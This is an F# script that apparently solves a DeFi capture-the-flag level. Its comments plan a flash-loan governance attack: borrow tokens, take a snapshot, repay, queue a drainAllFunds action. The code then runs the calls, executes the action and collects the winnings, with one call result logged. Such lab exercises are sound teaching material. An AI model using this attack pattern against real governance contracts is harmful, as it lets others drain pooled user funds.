#i """nuget: C:\Users\jon_h\source\repos\web3.fs\bin\Release\"""
#r "nuget: web3.fs, 0.2.3" 
#load "./Common.fsx"

#load "./Deployers/DeployLevel06.fsx"

open web3.fs
open Common
open DeployLevel06


// Anyone can call snapshot on the gov token. 
// There are flash loans in the gov token.
// Someone can dramatically inflate their stock, and take a snapshot. The token can then be repaid without further need.
// Using the snapshot, an `action` can be queued, in this case, to `drainAllFunds()`, which has `onlyGovernance()`
// Why does the action include wei/value?

// Challenge: Drain pool completely. No mention of bypassing timelock.
// 1) Take flashloan for 1 million and 1 DVTS.
// 2) Call snapshot()
// 3) repay loan
// 4) queue action with calldata equal to draining pool.
// 5) wait
// 6) profit

txnDevWith2 attacker (ByString "callLoanAndQueue") [] ZEROV |> logIt

// check that there is an action queued

callDevWith2 governance (ByString "actions") [Uint256 "1"] |> logIt

// [+] Call result: [Address "0xbf88e4ce1eb3fd0b69a07f2be29bb78526c24183"; Bytes "0x0cf209130000000000000000000000006b0bfb11bf7f2aae5e2ff6fea265d68f2a93fa2f"; Uint256 "0"; ... ]

// Call the execute action myself, since anyone can call it.
txnDevWith2 governance (ByString "executeAction") [Uint256 "1"] ZEROV |> logIt

txnDevWith2 attacker (ByString "transferWinnings") [] ZEROV |> logIt

